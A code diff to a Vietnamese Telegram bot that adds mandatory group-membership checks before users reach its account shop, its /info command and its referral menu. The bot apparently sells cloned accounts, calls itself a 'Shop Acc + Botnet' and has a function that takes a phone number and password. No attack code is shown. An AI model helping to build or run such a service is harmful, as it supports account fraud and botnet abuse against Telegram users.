@@ -126,8 +126,26 @@ def check_user_membership(user_id):
         print(f"Lỗi kiểm tra nhóm: {e}")
     return False
 
+def send_verification_prompt(chat_id):
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("📢 Tham gia nhóm ngay", url=f"https://t.me/{REQUIRED_GROUP.replace('@','')}"),
+        types.InlineKeyboardButton("🔄 Xác minh (Tôi đã tham gia)", callback_data="check_membership")
+    )
+    text = (
+        "⚠️ **YÊU CẦU XÁC MINH TÀI KHOẢN**\n\n"
+        f"🔒 Để sử dụng hệ thống, bạn bắt buộc phải tham gia nhóm: **{REQUIRED_GROUP}**.\n\n"
+        "👉 *Sau khi tham gia xong, bấm nút bên dưới.*"
+    )
+    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
+
 # ===== HÀM HIỂN THỊ MENU CHÍNH SHOP ACC =====
 def send_main_shop_menu(chat_id, user_id, message_id=None, edit=False):
+    # Ép buộc kiểm tra lại nhóm đối với cả người cũ lẫn mới trước khi mở shop
+    if not check_user_membership(user_id):
+        send_verification_prompt(chat_id)
+        return
+
     conn = get_db_connection()
     cur = conn.cursor()
     
@@ -166,7 +184,7 @@ def send_main_shop_menu(chat_id, user_id, message_id=None, edit=False):
     else:
         bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
 
-# ===== XỬ LÝ /START (KIỂM TRA NHÓM & VÀO THẲNG SHOP) =====
+# ===== XỬ LÝ /START =====
 @bot.message_handler(commands=['start'])
 def handle_start(message):
     user_id = message.from_user.id
@@ -192,14 +210,12 @@ def handle_start(message):
     cur.close()
     conn.close()
 
-    if not user['verified']:
-        if check_user_membership(user_id):
-            verify_user(user_id)
-            send_main_shop_menu(message.chat.id, user_id)
-        else:
-            send_verification_prompt(message.chat.id)
-    else:
+    # Kiểm tra nhóm bắt buộc ngay từ lệnh start
+    if check_user_membership(user_id):
+        verify_user(user_id)
         send_main_shop_menu(message.chat.id, user_id)
+    else:
+        send_verification_prompt(message.chat.id)
 
 def verify_user(user_id):
     conn = get_db_connection()
@@ -234,19 +250,6 @@ def verify_user(user_id):
     cur.close()
     conn.close()
 
-def send_verification_prompt(chat_id):
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(
-        types.InlineKeyboardButton("📢 Tham gia nhóm ngay", url=f"https://t.me/{REQUIRED_GROUP.replace('@','')}"),
-        types.InlineKeyboardButton("🔄 Xác minh (Tôi đã tham gia)", callback_data="check_membership")
-    )
-    text = (
-        "⚠️ **YÊU CẦU XÁC MINH TÀI KHOẢN**\n\n"
-        f"🔒 Để mở khóa cửa hàng, bạn bắt buộc phải tham gia nhóm: **{REQUIRED_GROUP}**.\n\n"
-        "👉 *Sau khi tham gia xong, bấm nút bên dưới.*"
-    )
-    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
-
 @bot.callback_query_handler(func=lambda call: call.data == "check_membership")
 def callback_check_membership(call):
     user_id = call.from_user.id
@@ -273,6 +276,11 @@ def callback_back_shop(call):
 @bot.callback_query_handler(func=lambda call: call.data == "how_to_earn_xu")
 def callback_how_to_earn_xu(call):
     user_id = call.from_user.id
+    if not check_user_membership(user_id):
+        bot.answer_callback_query(call.id, "❌ Bạn cần tham gia nhóm yêu cầu trước!", show_alert=True)
+        send_verification_prompt(call.message.chat.id)
+        return
+
     bot_info = bot.get_me()
     ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
 
@@ -302,6 +310,12 @@ def callback_how_to_earn_xu(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("shop_view_"))
 def callback_shop_view(call):
+    user_id = call.from_user.id
+    if not check_user_membership(user_id):
+        bot.answer_callback_query(call.id, "❌ Bạn cần tham gia nhóm yêu cầu trước!", show_alert=True)
+        send_verification_prompt(call.message.chat.id)
+        return
+
     category = call.data.replace("shop_view_", "")
     cat_name = "Clone Level 5–8" if category == "level_5_8" else "Clone Level 30"
     price = 10 if category == "level_5_8" else 15
@@ -482,6 +496,10 @@ def process_password(msg, phone):
 @bot.message_handler(commands=['info'])
 def account_info(message):
     user_id = message.from_user.id
+    if not check_user_membership(user_id):
+        send_verification_prompt(message.chat.id)
+        return
+
     conn = get_db_connection()
     cur = conn.cursor()
     cur.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,))
@@ -835,3 +853,4 @@ if __name__ == "__main__":
 
     print("✨ Bot tích hợp Shop Acc + Botnet đã sẵn sàng hoạt động!")
     bot.infinity_polling()
+ 
